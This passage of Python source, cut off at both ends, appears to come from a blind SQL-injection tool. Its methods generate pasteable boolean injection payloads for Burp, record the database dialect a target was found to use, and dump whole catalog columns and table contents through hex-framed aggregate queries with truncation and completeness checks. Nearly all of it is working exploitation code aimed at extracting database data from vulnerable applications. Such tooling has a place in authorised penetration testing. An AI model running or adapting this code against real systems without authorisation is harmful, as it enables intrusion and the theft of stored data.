                    "(no byte-exact primitive) - case/accents may be inexact" % table)
        elif exact and self.dialect.hexfn is not None and not effenc and self._hasNonAscii(rows):
            # bytes are faithful (hex), but with no PROVEN codec the TEXT reading of non-ASCII
            # cells is a guess (utf-8 vs a single-byte codepage) -> content is not provably exact
            exact = False
            note = ("dump %s: non-ASCII values decoded under an undetermined character set "
                    "- text may be inexact" % table)
        elif exact and self.dialect.textcast and not self._castPreservesAccents():
            # bytes are faithful, but they are the output of a text cast NOT proven to preserve a
            # canary accented char -> a narrowing cast may have folded unrepresentable chars to "?"
            # at equal length (invisible to the length witness AND to a non-ASCII scan of the
            # ALREADY-folded output) -> content is not provably source-exact
            exact = False
            note = ("dump %s: values extracted through a text cast not proven to preserve accented "
                    "characters (possible lossy/narrowing cast) - content is not provably "
                    "source-exact" % table)
        if note:
            self.dialect.notes.append(note)
        return {"columns": cols, "rows": rows, "complete": complete, "exact": exact, "keyed_by": keyed_by}

    @staticmethod
    def _hasNonAscii(rows):
        return any(any(ord(ch) > 127 for ch in v) for row in rows for v in row
                   if isinstance(v, type(u"")))

    def _castPreservesAccents(self):
        # The framed dump routes every column through the discovered text cast. A NARROWING cast
        # (Unicode source -> codepage target) substitutes an unrepresentable char ("e"-acute ->
        # "?") WITHOUT changing the character count, so neither the length witness nor the hex
        # decode can catch it - the "?" is faithfully hexed and reported as exact. Confirm the
        # cast preserves a canary accented char (built server-side from its code point, so no raw
        # byte crosses the transport): if CAST(canary)=canary holds, representable accents survive;
        # if it folds, the cast is lossy and non-ASCII content is not source-exact. Server-side
        # equality (not a client decode) sidesteps CHAR() byte-vs-codepoint quirks. Cached;
        # conservative (False) when a cast is applied but the canary can't be built/decided.
        if self._castPreserves is None:
            if not self.dialect.textcast:
                self._castPreserves = True                  # no cast applied -> nothing to fold
            elif (self.dialect.charset or "").replace("-", "").lower().startswith("utf"):
                # the cast targets the (Unicode) connection/DB charset, which represents EVERY code
                # point -> no source char can fold. This is a PROOF (not a per-value guess): a
                # utf-8/16 target cannot substitute an unrepresentable char.
                self._castPreserves = True
            else:
                # an unproven cast must NOT certify source identity: default False, promote only on
                # a successful preservation probe. The canary needs a TRUE-codepoint constructor - a
                # byte-based CHAR() (MySQL) yields the two bytes of U+20AC, not the euro char, so it
                # cannot probe a fold; without one the cast stays unproven (conservatively inexact).
                self._castPreserves = False
                cf = self._codeCharTmpl()
                if cf and self.dialect.length:
                    euro = cf.format(code=0x20AC)
                    ch = cf.format(code=0xE9)               # "e"-acute
                    try:
                        with self._probePhase():
                            if self._ask("(%s)=1" % self._len(euro)):   # constructor => one codepoint
                                self._castPreserves = self._ask(
                                    "(%s)=(%s)" % (self.dialect.textcast[1].format(expr=ch), ch))
                    except OracleUndecided:
                        pass
        return self._castPreserves

    def poc(self, expr, position=1, gt=64):
        """Emit a clean, pasteable boolean payload for ONE probe (the exploitation
        primitive), so a tester can drop it into Burp without re-running discovery."""
        one = self._sub(expr, position, 1)
        if self.dialect.compare == "code" and self.dialect.charcode:
            # numeric code comparison -> render through the DISCOVERED comparator, so the PoC
            # works on the very target where '>' was blocked (BETWEEN / operator-free rung)
            code = self.dialect.charcode[1].format(expr=one)
            if self._comparator == "gt":
                return "%s>%d" % (code, gt)
            if self._comparator == "between":
                return "%s BETWEEN %d AND %d" % (code, gt + 1, 1 << 62)
            if self._cmpTemplate is not None:
                return self._cmpTemplate.format(expr=code, n=gt)
            raise RuntimeError("ordered PoC unavailable: membership comparator has no '>' form")
        # hex / collation / ordinal compare strings or wrapped values with '>'; if '>' was
        # blocked (comparator isn't 'gt') there is NO equivalent renderer for these text modes
        # -> refuse rather than emit a predicate the target already rejected.
        if self._comparator != "gt":
            raise RuntimeError("ordered PoC unavailable: '>' blocked and %s mode has no operator-free form" % self.dialect.compare)
        if self.dialect.compare == "hex" and self.dialect.hexfn:
            return "%s>'%02X'" % (self.dialect.hexfn[1].format(expr=one), gt)
        if self.dialect.compare == "collation" and self.dialect.binwrap:
            w = self.dialect.binwrap[1]
            return "%s>%s" % (w.format(x=one), w.format(x=self._lit(chr(gt))))
        if self.dialect.compare in ("equality", "equality-ci"):
            # equality mode was chosen BECAUSE ordering isn't trustworthy - don't
            # fabricate a `>` predicate the target's collation may not honour
            raise RuntimeError("ordered PoC unavailable in equality-only compare mode")
        return "%s>%s" % (one, self._lit(chr(gt)))

    def strategy(self):
        """Freeze the discovered dialect into an immutable InferenceStrategy - the
        hand-off artifact for a host inference engine (see hostExtract). Ensures the
        hex fn and quoting/backslash flags are resolved before freezing."""
        d = self.dialect
        if not self._discovered:
            self.discover()
        self._ensureHexfn()
        self._lit("x")                               # resolve backslash-escape flag
        return InferenceStrategy(
            product=d.product or d.family, family=d.family, compare_mode=d.compare,
            catalog=d.catalog, dual=(d.dual[1] if d.dual else ""), notes=tuple(d.notes),
            substring=(d.substring[1] if d.substring else None),
            index_base=(d.substring.get("index_base", 1) if d.substring else 1),
            length=(d.length[1] if d.length else None),
            charcode=(d.charcode[1] if d.charcode else None),
            charcode_sem=(d.charcode.get("semantics") if d.charcode else None),
            hexfn=(d.hexfn[1] if d.hexfn else None),
            binwrap=(d.binwrap[1] if d.binwrap else None),
            charfrom=(d.charfrom[1] if d.charfrom else None),
            concat=(d.concat[1] if d.concat else None),
            identquote=(d.identQuote if d.identQuote and d.identQuote is not False else None),
            backslash=bool(self._backslashEscape),
            comparator=self._comparator, cmp_template=self._cmpTemplate,
            # carry the byte-exact witness so the host mirrors the native EXACT/AMBIGUOUS verdict
            # (plain '='/collation is not byte-exact; only proven hex / binary / codepoint is)
            exact_witness=("hex" if d.hexfn is not None else
                           "binary" if (d.binwrap is not None and d.binwrap.get("byte_exact")) else
                           "codepoint" if (d.compare == "code" and d.charcode is not None
                                           and d.charcode.get("semantics") == "codepoint") else None))

    def enumerateBulk(self, kind, maxchars=4096, encoding=None):
        """One-shot full dump: aggregate the whole column into one delimited string
        and extract it once. When a hex function exists each value is HEX-encoded
        before aggregation, so the ',' delimiter is unambiguous (a comma can't occur
        in a hex token) and any charset survives; otherwise raw values are joined
        (comma-ambiguous, noted). Completeness is checked against an independent
        COUNT(DISTINCT). Returns a BulkResult (list-like)."""
        if kind not in self.dialect.catalogEnum:
            return None
        col, src, where = self._source(kind)
        # independent COUNT FIRST - so a single empty-string row isn't mistaken for
        # an empty catalog (the aggregate of one '' can look like no rows)
        try:
            expected = self.extractInteger("(SELECT COUNT(DISTINCT %s) FROM %s%s)" % (col, src, where))
        except OverflowError:                              # huge count -> unknown, not a failure
            expected = None
        if expected == 0:
            return BulkResult([], expected=0, complete=True)
        if not self._ensureHexfn() or not self.dialect.concat:   # bulk framing needs BOTH hex and concat
            self.dialect.notes.append("bulk %s: no hex/concat framing - use enumerateKeyset" % kind)
            return None
        # frame each value as  V<hex>;  - 'V' distinguishes an empty string from a NULL
        # aggregate over zero rows, and the ';' TERMINAL MARKER (absent from the hex alphabet
        # and the ',' separator) proves the token is WHOLE: a server-side aggregate output
        # limit truncates the FINAL token, dropping its ';', so the truncated token is caught
        # instead of a shorter-but-still-valid-hex value silently counting as one item.
        encoding = encoding or (self.dialect.hexfn.get("encoding") if self.dialect.hexfn else None) or self.dialect.charset
        # frame each value as  V<charlen>:<hex>;  when a length fn exists: the ';' catches aggregate
        # truncation (final token loses it) AND the independent <charlen> catches a capped/lossy HEX
        # that shortened the VALUE (decoded chars != declared) - which the terminal marker alone
        # (round 5) missed because a shortened even-length hex is still valid+terminated.
        lenframed = bool(self.dialect.length and self.dialect.textcast)
        if lenframed:
            lenstr = self.dialect.textcast[1].format(expr=self._len(col))
            aggcol = self._concatMany(["'V'", lenstr, "':'", self.dialect.hexfn[1].format(expr=col), "';'"])
        else:
            aggcol = self._concatMany(["'V'", self.dialect.hexfn[1].format(expr=col), "';'"])
        if self.dialect.bulkAgg is None:
            self.dialect.bulkAgg = self._discoverBulkAgg(aggcol, src, where)
        if not self.dialect.bulkAgg:
            return None
        agg = self.dialect.bulkAgg[1].format(col=aggcol)
        res = self.extractResult("(SELECT %s FROM %s%s)" % (agg, src, where), limit=maxchars, _ceiling=maxchars)
        joined = res.value
        if joined is None:
            return BulkResult([], expected=expected, complete=False)
        tokens = joined.split(",")
        if res.truncated and tokens:                       # last token may be partial
            tokens = tokens[:-1]
        names, seen, aggtruncated = [], set(), False
        for t in tokens:
            if not (t.startswith("V") and t.endswith(";")):   # missing terminal marker
                aggtruncated = True                        # aggregate truncated this token -> drop, flag
                continue
            body = t[1:-1]                                 # strip 'V' prefix and ';' terminator
            declared = None
            if lenframed:
                lenpart, sep, hexpart = body.partition(":")
                if sep != ":" or not lenpart.isdigit():
                    aggtruncated = True                    # malformed length prefix -> truncated token
                    continue
                declared, body = int(lenpart), hexpart
            v = self._decodeHexToken(body, encoding)
            if v is not None and (declared is None or len(v) == declared):   # independent length witness
                if v not in seen:                          # dedupe (non-unique columns repeat)
                    seen.add(v)
                    names.append(v)
            elif v is not None:                            # decoded but length mismatch -> a capped hex shortened it
                aggtruncated = True
        complete = (not res.truncated) and (not aggtruncated) and expected is not None and len(names) == expected
        if aggtruncated:
            self.dialect.notes.append("bulk %s: aggregate output truncated (token lost its terminal marker)" % kind)
        elif expected is not None and len(names) != expected:
            self.dialect.notes.append("bulk %s: got %d of %d (incomplete)" % (kind, len(names), expected))
        return BulkResult(names, expected=expected, complete=complete)

    def _discoverBulkAgg(self, col, src, where):
        for name, tmpl in _BULK_AGG:
            agg = tmpl.format(col=col)
            if self._ask("(SELECT %s FROM %s%s) IS NOT NULL" % (agg, src, where)):
                return Cap(name, tmpl)
        return None
